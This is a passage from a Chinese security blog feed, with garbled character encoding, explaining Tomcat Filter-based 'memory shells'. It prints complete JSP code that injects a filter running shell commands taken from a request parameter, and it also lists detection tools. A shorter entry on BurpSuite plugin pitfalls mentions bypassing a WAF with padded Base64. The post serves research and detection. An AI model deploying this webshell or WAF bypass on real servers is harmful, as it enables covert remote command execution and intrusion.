operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>  <span class="token class-name">String</span> filterName <span class="token operator">=</span> <span class="token string">"coco"</span><span class="token punctuation">;</span>  <span class="token comment">//è·å–ApplicationContextFadeå¯¹è±¡ï¼ŒApplicationContextFadeæ˜¯ServletContextçš„å®ç°ï¼Œæ‰€ä»¥å…¶å®æ˜¯ServletContextå¯¹è±¡</span>  <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Field</span> appctx <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    appctx <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ä»ApplicationContextFadeè·å–contextï¼Œè¿™é‡Œcontextæ˜¯æŒ‡ApplicationContext</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  appctx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> appctx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è·å–ApplicationContext</span>  out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€å¼€å§‹çš„ä»£ç æ˜¯<code>ServletContext servletContext = request.getSession().getServletContext();</code>ï¼Œå¦‚æœçœ‹äº†<code>org.apache.catalina.core.ApplicationContextFacade</code>å°±æ˜ç™½è¿™é‡Œæ˜¯ä¸€ä¸ª<code>servletContext</code>å¯¹è±¡çš„å®ç°ï¼Œæ‰€ä»¥ä½¿ç”¨<code>servletContext</code>æ¥è¡¨ç¤ºï¼Œæ¥ä¸‹æ¥å°±æ˜¯é€šè¿‡åå°„è·å–<code>ApplicationContextFacade</code>çš„ç§æœ‰å˜é‡<code>context</code>ï¼Œå®é™…ä¸Šå°±æ˜¯<code>ApplicationContext</code>ï¼Œç„¶ååŒæ ·çš„æ–¹æ³•å»<code>ApplicationContext</code>é€šè¿‡åå°„è·å–<code>StandardContext</code>ï¼š<br><img src="/2022/04/14/memory-shell-1/context-2.png"></p><p>å®Œæ•´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.InputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Scanner"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationFilterConfig"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Constructor"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Context"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Map"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>  <span class="token comment">//è·å–ApplicationContextFadeå¯¹è±¡ï¼ŒApplicationContextFadeæ˜¯ServletContextçš„å®ç°ï¼Œæ‰€ä»¥å…¶å®æ˜¯ServletContextå¯¹è±¡</span>  <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Field</span> appctx <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    appctx <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ä»ApplicationContextFadeè·å–contextï¼Œè¿™é‡Œcontextæ˜¯æŒ‡ApplicationContext</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  appctx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> appctx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è·å–ApplicationContext</span>  <span class="token class-name">Field</span> standCtx <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  standCtx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> standCtx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Filter</span> filter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HttpServletRequest</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> servletRequest<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"coco"</span><span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"coco"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Scanner</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> output <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> s<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>          servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">//æŠŠåˆ›å»ºå¥½çš„filteråŒ…è£…ä¸ºFilterDefå¯¹è±¡</span>  <span class="token class-name">String</span> filterName <span class="token operator">=</span> <span class="token string">"coco"</span><span class="token punctuation">;</span>  <span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>filterName<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//è°ƒç”¨addFilterDefåŠ å…¥åˆ°filterDefs</span>  <span class="token comment">//åˆ›å»ºFilterMapå¹¶ä¸”åŠ å…¥åˆ°filterMaps</span>  <span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>filterName<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span>REQUEST<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//ä»standardContextè·å–filterConfigså¯¹è±¡</span>  <span class="token class-name">Field</span> <span class="token class-name">Configs</span> <span class="token operator">=</span> standardContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Map</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//åˆ©ç”¨åå°„åˆ›å»ºfilterConfig</span>  <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span> filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>filterName<span class="token punctuation">,</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>  out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å†…å­˜é©¬çš„æ’æŸ¥"><a href="#å†…å­˜é©¬çš„æ’æŸ¥" class="headerlink" title="å†…å­˜é©¬çš„æ’æŸ¥"></a>å†…å­˜é©¬çš„æ’æŸ¥</h2><p>å‚è€ƒå¤©ä¸‹å¤§æœ¨å¤´å¸ˆå‚…ï¼Œä¸»è¦æœ‰ä¸¤ç§æ’æŸ¥æ–¹å¼ï¼š</p><h4 id="é‡‡ç”¨å­—èŠ‚ç çš„æ–¹å¼"><a href="#é‡‡ç”¨å­—èŠ‚ç çš„æ–¹å¼" class="headerlink" title="é‡‡ç”¨å­—èŠ‚ç çš„æ–¹å¼"></a>é‡‡ç”¨å­—èŠ‚ç çš„æ–¹å¼</h4><ol><li><a href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></li><li><a href="https://github.com/LandGrey/copagent">https://github.com/LandGrey/copagent</a></li></ol><h4 id="æ‰«æè·å–å·²æœ‰çš„filter"><a href="#æ‰«æè·å–å·²æœ‰çš„filter" class="headerlink" title="æ‰«æè·å–å·²æœ‰çš„filter"></a>æ‰«æè·å–å·²æœ‰çš„filter</h4><p><a href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a><br>é€šè¿‡åå°„è·å–StandardContexté‡Œé¢æ‰€æœ‰çš„filter, <a href="https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/">Filter/Servletå‹å†…å­˜é©¬çš„æ‰«ææŠ“æ•ä¸æŸ¥æ€</a>:</p><pre class="line-numbers language-none"><code class="language-none">request.getSession().getServletContext() &#123;ApplicationContextFacade&#125;  -&gt; context &#123;ApplicationContext&#125;     -&gt; context &#123;StandardContext&#125;      * filterDefs      * filterMaps      * children      * servletMappings<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">Tomcatæºä»£ç è°ƒè¯•ç¬”è®°-çœ‹ä¸è§çš„Shell</a></li><li><a href="https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ">å†°èæ”¹é€ ä¹‹é€‚é…åŸºäºtomcat Filterçš„æ— æ–‡ä»¶webshell </a></li><li><a href="https://www.yuque.com/ppwdd/xz9rb1/ahe2no">Javaå†…å­˜é©¬ä¸“é¢˜å¥—é¤A</a></li><li><a href="https://mp.weixin.qq.com/s/gYGrdDtIldzrE7NHSxTDYQ">TomcatåŸºäºServletçš„æ— æ–‡ä»¶webshellçš„ç›¸å…³æŠ€æœ¯ç ”ç©¶</a></li><li><a href="https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/">Javaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°</a></li><li><a href="http://blog.nsfocus.net/webshell-interceptor/">å†…å­˜é©¬çš„æ”»é˜²åšå¼ˆä¹‹æ—…</a></li><li><a href="https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/">Filter/Servletå‹å†…å­˜é©¬çš„æ‰«ææŠ“æ•ä¸æŸ¥æ€</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Servlet&quot;&gt;&lt;a href=&quot;#Servlet&quot; class=&quot;headerlink&quot; title=&quot;Servlet&quot;&gt;&lt;/a&gt;Servlet&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2022/04/14/memory-shell-1/Servlet.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;å½“å¤„ç†è¯·æ±‚çš„æ—¶å€™ï¼šè¯·æ±‚ â†’ Listener â†’ Filter â†’ Servlet&lt;/p&gt;
&lt;h4 id=&quot;Listener&quot;&gt;&lt;a href=&quot;#Listener&quot; class=&quot;headerlink&quot; title=&quot;Listener&quot;&gt;&lt;/a&gt;Listener&lt;/h4&gt;&lt;p&gt;Listenerä¹Ÿç§°ä¹‹ä¸ºç›‘å¬å™¨ï¼Œå¯ä»¥ç›‘å¬Applicationã€Sessionå’ŒRequestå¯¹è±¡çš„åˆ›å»ºã€é”€æ¯äº‹ä»¶ï¼Œä»¥åŠç›‘å¬å¯¹å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§äº‹ä»¶ï¼Œå¹¶è‡ªåŠ¨æ‰§è¡Œè‡ªå®šä¹‰çš„åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;h4 id=&quot;Filter&quot;&gt;&lt;a href=&quot;#Filter&quot; class=&quot;headerlink&quot; title=&quot;Filter&quot;&gt;&lt;/a&gt;Filter&lt;/h4&gt;&lt;p&gt;Filterä¹Ÿç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œå¯ä»¥åŠ¨æ€åœ°ä¿®æ”¹HttpServletRequestï¼ŒHttpServletResponseä¸­çš„å¤´å’Œæ•°æ®ã€‚&lt;/p&gt;
&lt;h4 id=&quot;Servlet-1&quot;&gt;&lt;a href=&quot;#Servlet-1&quot; class=&quot;headerlink&quot; title=&quot;Servlet&quot;&gt;&lt;/a&gt;Servlet&lt;/h4&gt;&lt;p&gt;Servletæ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚å®ƒè´Ÿè´£å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚ç”Ÿæˆç›¸åº”çš„è¿”å›ä¿¡æ¯æä¾›ç»™ç”¨æˆ·ã€‚Servlet å¯ä»¥ç†è§£ä¸ºæŸä¸€ä¸ªè·¯å¾„åç»­çš„ä¸šåŠ¡å¤„ç†é€»è¾‘ã€‚&lt;/p&gt;
&lt;p&gt;Tomcatæ˜¯httpæœåŠ¡å™¨+servletå®¹å™¨ï¼Œå½“Tomcatä½œä¸ºServletå®¹å™¨çš„æ—¶å€™ï¼Œè®²httpè¯·æ±‚æ–‡æœ¬è§£æä¹‹åå°è£…æˆ&lt;code&gt;HttpServletRequest&lt;/code&gt;ç±»å‹çš„requestå¯¹è±¡ï¼Œä¼ é€’ç»™Servletï¼ŒåŒæ—¶è®²ç›¸åº”çš„ä¿¡æ¯å°è£…ä¸º&lt;code&gt;HttpServletResponse&lt;/code&gt;ç±»å‹çš„responseå¯¹è±¡ï¼Œå°†responseå¯¹è±¡äº¤ç»™tomcatï¼Œtomcatæ ¼å¼åŒ–ä¹‹åè¿”å›ç»™æµè§ˆå™¨&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>BurpSuiteæ’ä»¶å¼€å‘æ³¨æ„äº‹é¡¹</title>
    <link href="https://jkme.github.io/2022/04/11/burpsuite-ext-dev.html"/>
    <id>https://jkme.github.io/2022/04/11/burpsuite-ext-dev.html</id>
    <published>2022-04-10T16:00:00.000Z</published>
    <updated>2022-04-12T10:22:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-Base64çš„å‘"><a href="#0x1-Base64çš„å‘" class="headerlink" title="0x1. Base64çš„å‘"></a>0x1. Base64çš„å‘</h2><p>åœ¨JDK8ç‰ˆæœ¬é‡Œé¢ï¼ŒJavaè‡ªå¸¦çš„<code>java.util.Base64</code>æ˜¯æ ¹æ®RFC4648å’ŒRFC2045å®ç°çš„ï¼Œä½†æ˜¯JDK7é‡Œé¢çš„<code>sun.misc.BASE64Encoder</code>ï¼Œæ˜¯RFC1521å®ç°çš„ã€‚<br>è¿™ä¼šå¯¼è‡´<code>java.util.Base64</code>è§£ç JDK7ç‰ˆæœ¬çš„Base64å‘ç”Ÿé”™è¯¯ï¼š<code>Illegal base64 character</code>ã€‚</p><p>å¯ä»¥ä½¿ç”¨shiroçš„Base64è§£å†³ï¼Œå¢åŠ mavenä¾èµ–:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>shiro<span class="token operator">-</span>core<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PS: chybetaå¸ˆå‚…åœ¨æ¼æ´ç™¾å‡ºé‡Œé¢æå‡ºè¿‡ï¼ŒShiroåœ¨Base64è§£ç çš„æ—¶å€™ä¼šä¸¢å¼ƒéBase64å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ç»•è¿‡WAFé˜²ç«å¢™ï¼Œæ¯”å¦‚å¡«å……åƒåœ¾å­—ç¬¦ä¸²ã€‚</p><h2 id="0x2-RSAå…¬ç§é’¥"><a href="#0x2-RSAå…¬ç§é’¥" class="headerlink" title="0x2. RSAå…¬ç§é’¥"></a>0x2. RSAå…¬ç§é’¥</h2><p>PythonåŠ è§£å¯†çš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ˜¯PKCS#1æ ¼å¼çš„å…¬ç§é’¥ï¼š</p><pre class="line-numbers language-none"><code class="language-none"># å…¬é’¥-----BEGIN RSA PUBLIC KEY----------END RSA PUBLIC KEY-----  # ç§é’¥-----BEGIN RSA PRIVATE KEY----------END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯åœ¨Javaé‡Œé¢éœ€è¦ä½¿ç”¨PKCS#8æ 